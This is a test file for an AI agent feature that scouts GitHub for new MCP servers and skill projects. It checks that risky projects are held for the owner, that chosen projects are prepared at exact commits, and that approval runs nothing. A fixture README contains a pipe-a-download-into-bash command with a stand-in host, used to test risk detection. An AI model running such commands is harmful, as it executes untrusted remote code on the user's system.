import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {decideProposal,readScoutLedger,runProjectScout,scoreRepo,scoutDue,scoutQueries} from "../src/autonomy/project-scout.js";

const now=new Date("2026-11-12T08:00:00Z");
const sha=(c:string)=>c.repeat(40);
const repo=(name:string,extra:Record<string,unknown>={})=>({full_name:name,html_url:"https://github.com/"+name,default_branch:"main",fork:false,archived:false,stargazers_count:5000,
  created_at:"2026-08-01T00:00:00Z",pushed_at:"2026-11-10T00:00:00Z",license:{spdx_id:"MIT"},description:"",topics:[],...extra});
const repos=[
  repo("acme/browser-mcp",{description:"MCP server for browser automation",topics:["mcp-server"]}),
  repo("acme/skills",{description:"agent skills for code review"}),
  repo("acme/coin-bot",{description:"crypto trading bot"}),
  repo("acme/old",{pushed_at:"2025-01-01T00:00:00Z"}),
  repo("acme/gpl",{license:{spdx_id:"GPL-3.0"}}),
  repo("acme/tiny",{stargazers_count:20}),
  repo("acme/forked",{fork:true}),
  repo("acme/installer",{description:"a cli tool"})
];
const files:Record<string,Record<string,string>>={
  "acme/browser-mcp":{"package.json":JSON.stringify({name:"@acme/browser-mcp",version:"1.4.2",dependencies:{"@modelcontextprotocol/sdk":"1"}}),"README.md":"# Browser MCP\nnpx @acme/browser-mcp"},
  "acme/skills":{"package.json":"","README.md":"skills"},
  "acme/coin-bot":{"README.md":"trade"},
  "acme/installer":{"package.json":JSON.stringify({name:"installer",version:"1.0.0",scripts:{postinstall:"node setup.js"}}),"README.md":"curl https://x.example/i.sh | bash"}
};
const asked:string[]=[];
const client={
  json:async(url:string)=>{
    asked.push(url);
    if(url.includes("/search/repositories"))return{items:repos};
    const name=/repos\/([^/]+\/[^/]+)\//.exec(url)![1]!;
    if(url.includes("/commits/"))return{sha:sha(String(repos.findIndex(r=>r.full_name===name)%10))};
    if(url.includes("/git/trees/"))return{tree:name==="acme/skills"?[{path:"review/SKILL.md",type:"blob"}]:[]};
    throw new Error("unexpected "+url);
  },
  text:async(url:string)=>{const m=/githubusercontent\.com\/([^/]+\/[^/]+)\/[a-f0-9]{40}\/(.+)$/.exec(url)!;const t=files[m[1]!]?.[m[2]!];if(t===undefined)throw new Error("404");return t;}
};

// Only fixed words are searched for; recent, popular, permissive, not forks.
const queries=scoutQueries(now);
assert.ok(queries.every(q=>q.includes("stars:>=200")&&q.includes("pushed:>=2026-08-14")&&q.includes("fork:false")));
assert.ok(queries.some(q=>q.startsWith("topic:mcp-server")));
assert.ok(scoreRepo(repos[0]!,now)>scoreRepo({...repos[7]!,stargazers_count:300},now),"popular and relevant ranks higher");

const store=fs.mkdtempSync(path.join(os.tmpdir(),"scout-"));
const prepared:string[]=[];
const prepare=async(input:{target:string;ref:string;why:string})=>{prepared.push(input.target+"@"+input.ref);return{id:"intake-"+prepared.length,status:"awaiting_owner",findings:[],skills:input.target.includes("skills")?["review/SKILL.md"]:[]} as never;};
const ledger=await runProjectScout(store,{client,now,intakeRoot:path.join(store,"intake"),prepare:prepare as never});
const byRepo=Object.fromEntries(ledger.proposals.map(p=>[p.repo,p]));
assert.deepEqual(Object.keys(byRepo).sort(),["acme/browser-mcp","acme/coin-bot","acme/installer","acme/skills"],"old, GPL, tiny and forked projects are left out");
assert.equal(byRepo["acme/browser-mcp"]!.kind,"mcp");
assert.deepEqual(byRepo["acme/browser-mcp"]!.npm,{name:"@acme/browser-mcp",version:"1.4.2"});
assert.equal(byRepo["acme/skills"]!.kind,"skills");
assert.equal(byRepo["acme/coin-bot"]!.status,"held","money is the owner's call, not prepared");
assert.equal(byRepo["acme/installer"]!.status,"held");
assert.ok(byRepo["acme/installer"]!.risks.some(r=>/postinstall/.test(r))&&byRepo["acme/installer"]!.risks.some(r=>/pipe a download/.test(r)));
assert.ok(prepared.length<=3&&prepared.every(p=>/\.git@[a-f0-9]{40}$/.test(p)),"prepared at an exact commit");
assert.ok(!prepared.some(p=>/coin-bot|installer/.test(p)),"held projects are not fetched");
assert.equal(byRepo["acme/browser-mcp"]!.status,"awaiting_owner");

// The same projects are not proposed again the next day.
const again=await runProjectScout(store,{client,now:new Date("2026-11-13T09:00:00Z"),intakeRoot:path.join(store,"intake"),prepare:prepare as never});
assert.equal(again.proposals.length,4);

// Approving: nothing runs. The MCP server is added switched off; the intake decision is recorded.
const intakeRoot=path.join(store,"intake");fs.mkdirSync(intakeRoot,{recursive:true});
const mcpProposal=byRepo["acme/browser-mcp"]!;
fs.writeFileSync(path.join(intakeRoot,"records.json"),JSON.stringify([]));
// Without a real quarantine record, decide the proposal through a ledger that has no intake id.
const l=readScoutLedger(store);l.proposals.find(p=>p.id===mcpProposal.id)!.intakeId=undefined;fs.writeFileSync(path.join(store,"project-scout.json"),JSON.stringify(l));
const added:Record<string,unknown>[]=[];
const decided=await decideProposal(store,intakeRoot,mcpProposal.id,"approved",{addMcpServer:c=>{added.push(c);return c;}},now,(async()=>({id:"",status:"awaiting_owner",findings:[],skills:[]})) as never);
assert.equal(decided.status,"approved");
assert.deepEqual(added[0]!.args,["-y","@acme/browser-mcp@1.4.2"]);
assert.match(decided.next!,/switched off/);
await assert.rejects(decideProposal(store,intakeRoot,mcpProposal.id,"rejected"),/already_decided/);
// Approving something never prepared scans it first; a refused scan means no approval.
{
  const l2=readScoutLedger(store),held=l2.proposals.find(p=>p.repo==="acme/coin-bot")!;
  const refusedScan=await decideProposal(store,intakeRoot,held.id,"approved",{addMcpServer:()=>{throw new Error("must not be added");}},now,(async()=>({id:"x",status:"refused",reason:"Pipes a download into a shell",findings:[{severity:"high",file:"install.sh",issue:"Pipes a download into a shell"}],skills:[]})) as never);
  assert.equal(refusedScan.status,"refused");
  assert.match(refusedScan.next!,/scan refused/);
}
// Preparation keeps going past projects the scan refuses (seen live: the first three were refused, the best two never prepared).
{
  const store2=fs.mkdtempSync(path.join(os.tmpdir(),"scout2-"));let n=0;
  const picky=async(input:{target:string})=>{n++;return{id:"i"+n,status:n<=1?"refused":"awaiting_owner",findings:[],skills:[]} as never;};
  const l3=await runProjectScout(store2,{client,now,intakeRoot:path.join(store2,"intake"),prepare:picky as never});
  assert.equal(l3.proposals.filter(p=>p.status==="awaiting_owner").length,1,"one refused, the next ones still prepared");
  assert.equal(l3.proposals.filter(p=>p.status==="refused").length,1);
  fs.rmSync(store2,{recursive:true,force:true});
}

assert.equal(scoutDue(store,new Date("2026-11-13T10:00:00Z")),false,"ran within the day");
assert.equal(scoutDue(store,new Date("2026-11-14T12:00:00Z")),true);
assert.equal(scoutDue(store,new Date("2026-11-14T12:00:00Z"),{LAYANX_PROJECT_SCOUT:"off"}),false);
fs.rmSync(store,{recursive:true,force:true});
// The panel lists proposals with Approve and Reject, and the owner routes exist.
const app=fs.readFileSync(new URL("../web/app.js",import.meta.url),"utf8"),routes=fs.readFileSync(new URL("../src/owner-routes.ts",import.meta.url),"utf8");
assert.match(app,/await mcpPanel\(\),await scoutPanel\(\)/);
assert.match(app,/scoutL:"مشاريع مقترحة من GitHub"/);
assert.match(app,/"\/v1\/scout\/"\+encodeURIComponent\(id\)\+"\/decide"/);
assert.match(routes,/route==="\/v1\/scout\/run"/);
console.log("project-scout: finds popular new projects, holds risky ones, prepares the best at an exact commit, and runs nothing on approval");
